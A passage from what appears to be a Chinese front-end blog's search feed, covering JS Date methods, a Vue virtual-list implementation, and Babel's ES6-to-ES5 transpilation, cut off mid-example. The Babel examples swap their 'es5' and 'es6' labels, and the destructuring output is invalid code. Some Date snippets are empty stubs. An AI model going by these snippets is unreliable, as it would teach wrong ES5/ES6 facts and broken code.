style="text-align:center">返回值</td></tr><tr><td><code>Date.prototype.toDateString()</code></td><td style="text-align:center">Wed May 06 2020</td></tr><tr><td><code>Date.prototype.toISOString()</code></td><td style="text-align:center">2020-05-06T06:17:38.124Z</td></tr><tr><td><code>Date.prototype.toJSON()</code></td><td style="text-align:center">2020-05-06T06:17:38.124Z</td></tr><tr><td><code>Date.prototype.toLocaleDateString()</code></td><td style="text-align:center">2020/5/6</td></tr><tr><td><code>Date.prototype.toLocaleString()</code></td><td style="text-align:center">2020/5/6 下午2:17:38</td></tr><tr><td><code>Date.prototype.toLocaleTimeString()</code></td><td style="text-align:center">下午2:17:38</td></tr><tr><td><code>Date.prototype.toString()</code></td><td style="text-align:center">Wed May 06 2020 14:17:38 GMT+0800 (中国标准时间)</td></tr><tr><td><code>Date.prototype.toTimeString()</code></td><td style="text-align:center">14:17:38 GMT+0800 (中国标准时间)</td></tr><tr><td><code>Date.prototype.toUTCString()</code></td><td style="text-align:center">Wed, 06 May 2020 06:17:38 GMT</td></tr><tr><td><code>Date.prototype.valueOf()</code></td><td style="text-align:center">1588745858124</td></tr></tbody></table><p><br></p><h3 id="3-常用方法"><a href="#3-常用方法" class="headerlink" title="3. 常用方法"></a>3. 常用方法</h3><ul><li><p>校验日期格式</p></li><li><p>时间戳</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 当前时间戳</span></span><br><span class="line"><span class="keyword">const</span> seconds = <span class="built_in">Math</span>.floor(<span class="built_in">Date</span>.now() / <span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定日期转时间戳</span></span><br><span class="line"><span class="keyword">const</span> seconds = </span><br><span class="line"></span><br><span class="line"><span class="comment">// 时间戳转日期</span></span><br></pre></td></tr></table></figure></li><li><p>时间格式化</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span></span><br></pre></td></tr></table></figure></li><li><p>根据日期获取区间</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取日期所在周区间</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取日期所在月区间</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取日期所在年</span></span><br></pre></td></tr></table></figure></li><li><p>计算时间差</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> start = <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="string">'2020-01-02'</span>)</span><br><span class="line"><span class="keyword">var</span> end = <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="string">'2020-01-03'</span>)</span><br><span class="line"><span class="keyword">var</span> elapsed = end.getTime() - start.getTime()</span><br></pre></td></tr></table></figure></li><li><p>比较日期</p></li><li><p>从一个日期添加/减去增量</p></li><li><p>UTC，本地时间转换</p></li></ul><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://juejin.im/post/5d12b308f265da1b7c612746" target="_blank" rel="noopener">需要知道的JS的日期的知识，都在这了</a></li><li><a href="https://juejin.im/post/5b9f4df66fb9a05d2e1b8f02#heading-13" target="_blank" rel="noopener">【译】你可能不需要Moment.js</a></li><li><a href="https://github.com/iamkun/dayjs/blob/dev/src/index.js" target="_blank" rel="noopener">https://github.com/iamkun/dayjs/blob/dev/src/index.js</a></li></ul>]]></content>
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>虚拟列表 - 渲染10w条数据</title>
      <link href="/2020/04/26/%E8%99%9A%E6%8B%9F%E5%88%97%E8%A1%A8/"/>
      <url>/2020/04/26/%E8%99%9A%E6%8B%9F%E5%88%97%E8%A1%A8/</url>
      <content type="html"><![CDATA[<blockquote><p>产品：现在有10w条数据要展示，不分页，放一个表格里OK不 <br>我  ：这一条数据100个属性，浏览器hold不住的 <br>产品：那最多几条 <br>我  ：500 ？？（ 空气凝固3s…） 等我看看再回你</p></blockquote><p><br></p><h3 id="1-为什么要用虚拟列表"><a href="#1-为什么要用虚拟列表" class="headerlink" title="1. 为什么要用虚拟列表"></a>1. 为什么要用虚拟列表</h3><p>假设我们的列表需要展示1w条数据，我们同时将1w条数据渲染到页面中。看看会花费多少时间。可以粗略的统计到，JS的运行时间为<em><code>38ms</code></em>,但渲染完成后的总时间为<em><code>957ms</code></em>。当JS执行栈中的事件全部执行完后，才会触发渲染线程对页面进行渲染。</p><p><img src="/2020/04/26/虚拟列表/2.png"></p><p>通过Performance来看从执行到渲染结束，时间花在了哪里：</p><ul><li><em><code>Event(click)</code></em> : 40.84ms</li><li><em><code>Recalculate Style</code></em> : 105.08ms</li><li><em><code>Layout</code></em> : 731.56ms</li><li><em><code>Update Layer Tree</code></em> : 58.87ms</li><li><em><code>Paint</code></em> : 15.32ms</li></ul><p>消耗时间最多的两个阶段是</p><ul><li><em><code>Recalculate Style</code></em>： 样式计算，浏览器根据css选择器计算哪些元素应该应用哪些规则，确定每个元素具体的样式</li><li><em><code>Layout</code></em>： 布局，知道元素应用哪些规则之后，浏览器开始计算它要占据的空间大小及其在屏幕的位置</li></ul><p>当DOM节点数量越多的时候，每一次滚动的时候，都会消耗大量的时间，内存用来计算布局，最后导致页面卡顿。但是如果我们只考虑能看到的数据，那实际渲染的数据量就会非常的少，减少了大量不必要的重绘。</p><p><br></p><h3 id="2-实现一个虚拟列表"><a href="#2-实现一个虚拟列表" class="headerlink" title="2. 实现一个虚拟列表"></a>2. 实现一个虚拟列表</h3><p>虚拟列表，实际上是在首屏加载的时候，只加载<em>可视区域</em>需要的列表项，当滚动发生时，动态计算拿到<em>可视区域</em>的列表项，并将<em>非可视区域</em>内存在的列表项删除。</p><p><img src="/2020/04/26/虚拟列表/3.png" style="width:500px"></p><p>创建一个<em><code>infinite-list-phantom</code></em>虚拟div，把它的高度设置成总高度，用来撑高整个div，生成滚动条。<br>滚动时，设置可视列表<em><code>infinite-list</code></em> 的 <em><code>transform</code></em>位移属性，为滚动高度，并更新可视列表数据。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">ref</span>=<span class="string">"list"</span> <span class="attr">id</span>=<span class="string">"infinite-list-container"</span> @<span class="attr">scroll</span>=<span class="string">"handleScroll($event)"</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 容器的占位div，高度为总列表高度，用于生成滚动条--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"infinite-list-phantom"</span> <span class="attr">:style</span>=<span class="string">"&#123; height: listHeight + 'px' &#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!-- 可视列表，实际渲染列表 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"infinite-list"</span> <span class="attr">:style</span>=<span class="string">"&#123; transform: getTransform &#125;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> </span></span><br><span class="line"><span class="tag">      <span class="attr">class</span>=<span class="string">"infinite-list-item"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">v-for</span>=<span class="string">"item in visibleData"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">:key</span>=<span class="string">"item.id"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">:style</span>=<span class="string">"&#123; height: itemSize + 'px', lineHeight: itemSize + 'px' &#125;"</span></span></span><br><span class="line"><span class="tag">    &gt;</span>&#123;&#123; item.value &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">  el: <span class="string">'#infinite-list-container'</span>,</span></span><br><span class="line"><span class="undefined">  data() &#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">this</span>.itemSize = <span class="number">30</span>; <span class="comment">// 每项高度</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">      listData: [], <span class="comment">// 所有列表数据</span></span></span><br><span class="line"><span class="javascript">      start: <span class="number">0</span>, <span class="comment">// 开始索引</span></span></span><br><span class="line"><span class="javascript">      end: <span class="number">0</span>, <span class="comment">// 结束索引</span></span></span><br><span class="line"><span class="javascript">      screenHeight: <span class="number">0</span>, <span class="comment">// 可视区域高度</span></span></span><br><span class="line"><span class="javascript">      startOffset: <span class="number">0</span>, <span class="comment">// 偏移量</span></span></span><br><span class="line"><span class="undefined">    &#125;;</span></span><br><span class="line"><span class="undefined">  &#125;,</span></span><br><span class="line"><span class="undefined">  computed: &#123;</span></span><br><span class="line"><span class="javascript">    visibleData() &#123; <span class="comment">// 真实显示的列表数据</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">return</span> <span class="keyword">this</span>.listData.slice(<span class="keyword">this</span>.start, <span class="built_in">Math</span>.min(<span class="keyword">this</span>.end, <span class="keyword">this</span>.listData.length))</span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="javascript">    visibleCount() &#123; <span class="comment">// 可显示的列表项数</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">return</span> <span class="built_in">Math</span>.ceil(<span class="keyword">this</span>.screenHeight / <span class="keyword">this</span>.itemSize)</span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="javascript">    listHeight() &#123; <span class="comment">// 列表总高度</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">return</span> <span class="keyword">this</span>.listData.length * <span class="keyword">this</span>.itemSize</span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="javascript">    getTransform() &#123; <span class="comment">// 偏移量对应的style</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">return</span> <span class="string">`translate3d(0, <span class="subst">$&#123;<span class="keyword">this</span>.startOffset&#125;</span>px, 0)`</span></span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  &#125;,</span></span><br><span class="line"><span class="undefined">  methods: &#123;</span></span><br><span class="line"><span class="undefined">    handleScroll() &#123;</span></span><br><span class="line"><span class="javascript">      <span class="comment">// 当前滚动位置</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">let</span> scrollTop = <span class="keyword">this</span>.$refs.list.scrollTop;</span></span><br><span class="line"><span class="javascript">      <span class="comment">// 设置可视列表开始，结束索引</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">this</span>.start = <span class="built_in">Math</span>.floor(scrollTop / <span class="keyword">this</span>.itemSize);</span></span><br><span class="line"><span class="javascript">      <span class="keyword">this</span>.end = <span class="keyword">this</span>.start + <span class="keyword">this</span>.visibleCount;</span></span><br><span class="line"><span class="javascript">      <span class="comment">// 更新偏移量</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">this</span>.startOffset = scrollTop - (scrollTop % <span class="keyword">this</span>.itemSize)</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  &#125;,</span></span><br><span class="line"><span class="undefined">  mounted() &#123;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 初始化假数据</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> arr = [];</span></span><br><span class="line"><span class="javascript">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">20000</span>; i++) &#123;</span></span><br><span class="line"><span class="javascript">      arr.push(&#123; <span class="attr">id</span>: i, <span class="attr">value</span>: <span class="string">`第<span class="subst">$&#123;i + <span class="number">1</span>&#125;</span>条数据内容`</span>&#125;);</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">this</span>.listData = arr;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">this</span>.screenHeight = <span class="keyword">this</span>.$el.clientHeight;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">this</span>.start = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">this</span>.end = <span class="keyword">this</span>.start + <span class="keyword">this</span>.visibleCount;</span></span><br><span class="line"><span class="undefined">    &#125;, 0)</span></span><br><span class="line"><span class="undefined">  &#125;,</span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css"><span class="selector-id">#infinite-list-container</span> &#123;</span></span><br><span class="line"><span class="undefined">  height: 500px;</span></span><br><span class="line"><span class="undefined">  overflow: auto;</span></span><br><span class="line"><span class="undefined">  position: relative;</span></span><br><span class="line"><span class="undefined">  -webkit-overflow-scrolling: touch;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="css"><span class="selector-class">.infinite-list-phantom</span> &#123;</span></span><br><span class="line"><span class="undefined">  position: absolute;</span></span><br><span class="line"><span class="undefined">  top: 0;</span></span><br><span class="line"><span class="undefined">  left: 0;</span></span><br><span class="line"><span class="undefined">  right: 0;</span></span><br><span class="line"><span class="undefined">  z-index: -1;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="css"><span class="selector-class">.infinite-list</span> &#123;</span></span><br><span class="line"><span class="undefined">  position: absolute;</span></span><br><span class="line"><span class="undefined">  top: 0;</span></span><br><span class="line"><span class="undefined">  left: 0;</span></span><br><span class="line"><span class="undefined">  right: 0;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="css"><span class="selector-class">.infinite-list-item</span> &#123;</span></span><br><span class="line"><span class="css">  <span class="selector-tag">border-bottom</span>: 1<span class="selector-tag">px</span> <span class="selector-tag">solid</span> <span class="selector-id">#999</span>;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://juejin.im/post/5d76f469f265da039a28aff7" target="_blank" rel="noopener">「前端进阶」高性能渲染十万条数据(时间分片)</a></li><li><a href="https://juejin.im/post/5db684ddf265da4d495c40e5" target="_blank" rel="noopener">「前端进阶」高性能渲染十万条数据(虚拟列表)</a></li><li><a href="https://juejin.im/post/5ce75d205188252dc544e7fd" target="_blank" rel="noopener">长列表优化之虚拟列表</a></li></ul>]]></content>
      
      <categories>
          
          <category> Bug </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Babel：用es5实现es6语法</title>
      <link href="/2020/04/23/babel/"/>
      <url>/2020/04/23/babel/</url>
      <content type="html"><![CDATA[<blockquote><p>因为要兼容IE，跑了一下Babel文档，发现。。恩？兼容IE，不就是把ES6语法转换成ES5语法吗！果断解锁考点！</p></blockquote><p><br></p><h3 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h3><p>Babel是一个Javascript编译器，用于将ES5+的代码转换为向后兼容的JS语法，以便能够运行在当前和旧版本的浏览器或其他环境中。<a href="https://www.babeljs.cn/docs/usage" target="_blank" rel="noopener">官方Demo</a></p><p>Babel 的功能很纯粹，它只是一个编译器，大多数编译器的工作过程可以分为三部分：</p><ul><li>解析（Parsing）：将代码字符串解析成抽象语法树。</li><li>转换（Transformation）：对抽象语法树进行转换操作。</li><li>生成（Code Generation）: 根据变换后的抽象语法树再生成代码字符串。</li></ul><table><thead><tr><th>组成</th><th style="text-align:right">作用</th></tr></thead><tbody><tr><td>@babel/core</td><td style="text-align:right">实现语法解析，转换</td></tr><tr><td>@babel/preset-env</td><td style="text-align:right">plugins是一些js程序，用来指导babel如何对代码执行转换。你可以写自己的插件。<br>preset是多个plugins的组合。</td></tr><tr><td>@babel/cli</td><td style="text-align:right">允许你在终端用命令行实现语法转换。把src目录下的所有js文件，编译输出到lib目录。<br><code>./node_modules/.bin/babel src --out-dir lib</code> </td></tr><tr><td>@babel/polyfill</td><td style="text-align:right">Babel默认只转换新的JS语法，而不转换新的API，如Iterator, Generator, Set, Maps, Proxy, Reflect, Symbol, Promise等全局对象。当运行环境(<em>IE</em>)并没有实现一些全局对象时，babel-polyfill会给其做兼容。</td></tr></tbody></table><p><br></p><h3 id="1-1-Babel职责范围"><a href="#1-1-Babel职责范围" class="headerlink" title="1.1 Babel职责范围"></a>1.1 Babel职责范围</h3><p>Babel 只是转译新标准引入的语法，比如：</p><ul><li>箭头函数</li><li>let / const</li><li>解构</li></ul><p>哪些在 Babel 范围外？对于新标准引入的全局变量、部分原生对象新增的原型链上的方法：</p><ul><li>全局变量<ul><li>Promise</li><li>Symbol</li><li>WeakMap</li><li>Set</li></ul></li><li>includes</li><li>generator 函数</li></ul><p>对于上面的这些 API，Babel 是不会转译的，需要引入 polyfill 来解决。</p><p><br></p><h3 id="2-es5实现es6语法糖"><a href="#2-es5实现es6语法糖" class="headerlink" title="2. es5实现es6语法糖"></a>2. es5实现<a href="https://github.com/lukehoban/es6features#readme" target="_blank" rel="noopener">es6语法糖</a></h3><p>要想知道babel怎么实现ES6语法，直接到<a href="https://babeljs.io/repl#?browsers=&amp;build=&amp;builtIns=false&amp;spec=false&amp;loose=false&amp;code_lz=MYewdgzgLgBAhjAvDATAbgFAOQRiA&amp;debug=false&amp;forceAllTransforms=false&amp;shippedProposals=false&amp;circleciRepo=&amp;evaluate=false&amp;fileSize=false&amp;timeTravel=false&amp;sourceType=module&amp;lineWrap=true&amp;presets=es2015%2Creact%2Cstage-2&amp;prettier=false&amp;targets=&amp;version=7.9.0&amp;externalPlugins=" target="_blank" rel="noopener">Babel官网的REPL在线编辑器</a>，配置好<code>preset</code>和<code>plugins</code>后，输入你想要转化的代码，babel自动会给你输出转化后的代码。</p><h4 id="2-1-let-const"><a href="#2-1-let-const" class="headerlink" title="2.1 let, const"></a>2.1 let, const</h4><ul><li><p>cosnt </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// es5</span></span><br><span class="line"><span class="keyword">const</span> a = <span class="number">1</span>;</span><br><span class="line">a = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// es6</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_readOnlyError</span>(<span class="params">name</span>) </span>&#123; <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"\""</span> + name + <span class="string">"\" is read-only"</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line">a = (_readOnlyError(<span class="string">"a"</span>), <span class="number">2</span>);</span><br></pre></td></tr></table></figure></li><li><p>块级作用域</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// es5</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> x = <span class="string">'foo'</span>;</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="string">'bar'</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(x);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// es6</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> x = <span class="string">'foo'</span>;</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">var</span> _x = <span class="string">'bar'</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(_x);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="2-2-箭头函数"><a href="#2-2-箭头函数" class="headerlink" title="2.2 箭头函数"></a>2.2 箭头函数</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// es5</span></span><br><span class="line"><span class="keyword">const</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>].map(<span class="function"><span class="params">v</span> =&gt;</span> v + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// es6 </span></span><br><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].map(<span class="function"><span class="keyword">function</span> (<span class="params">v</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> v + <span class="number">1</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><br></p><h4 id="2-3-函数默认参数"><a href="#2-3-函数默认参数" class="headerlink" title="2.3 函数默认参数"></a>2.3 函数默认参数</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// es5</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x, y = <span class="number">12</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x + y</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// es6</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> y = <span class="built_in">arguments</span>.length &gt; <span class="number">1</span> &amp;&amp; <span class="built_in">arguments</span>[<span class="number">1</span>] !== <span class="literal">undefined</span> ? <span class="built_in">arguments</span>[<span class="number">1</span>] : <span class="number">12</span>;</span><br><span class="line">  <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="2-4-解构"><a href="#2-4-解构" class="headerlink" title="2.4 解构"></a>2.4 解构</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// es5</span></span><br><span class="line"><span class="keyword">const</span> [a, ,b] = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">const</span> &#123; c, d, <span class="attr">e</span>: &#123; f &#125; &#125; = &#123; <span class="attr">c</span>: <span class="number">1</span>, <span class="attr">d</span>: <span class="number">2</span>, <span class="attr">e</span>: &#123; <span class="attr">f</span>: <span class="number">3</span> &#125; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// es6</span></span><br><span class="line"><span class="keyword">var</span> _ref = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">a = _ref[<span class="number">0</span>],</span><br><span class="line">b = _ref[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> _c$d$e = <span class="keyword">const</span> &#123; c, d, <span class="attr">e</span>: &#123; f &#125; &#125; = &#123; <span class="attr">c</span>: <span class="number">1</span>, <span class="attr">d</span>: <span class="number">2</span>, <span class="attr">e</span>: &#123; <span class="attr">f</span>: <span class="number">3</span> &#125; &#125;,</span><br><span class="line">c = _c$d$e.c,</span><br><span class="line">d = _c$d$e.d,</span><br><span class="line">f = _c$d$e.e.f;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="2-5-模板字符串"><a href="#2-5-模板字符串" class="headerlink" title="2.5 模板字符串"></a>2.5 模板字符串</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// es5</span></span><br><span class="line"><span class="keyword">const</span> name = <span class="string">'小明'</span></span><br><span class="line"><span class="keyword">const</span> time = <span class="string">'today'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> b = <span class="string">`hello <span class="subst">$&#123;name&#125;</span>`</span>;</span><br><span class="line"><span class="keyword">const</span> c = <span class="string">`hello <span class="subst">$&#123;name&#125;</span>,</span></span><br><span class="line"><span class="string">how are you <span class="subst">$&#123;today&#125;</span>`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// es6</span></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">'小明'</span>;</span><br><span class="line"><span class="keyword">var</span> time = <span class="string">'today'</span>;</span><br><span class="line"><span class="keyword">var</span> b = <span class="string">"hello "</span>.concat(name);</span><br><span class="line"><span class="keyword">var</span> c = <span class="string">"hello "</span>.concat(name, <span class="string">",\n\thow are you "</span>).concat(today);</span><br></pre></td></tr></table></figure><p><br></p><h4 id="2-6-Class"><a href="#2-6-Class" class="headerlink" title="2.6 Class"></a>2.6 Class</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 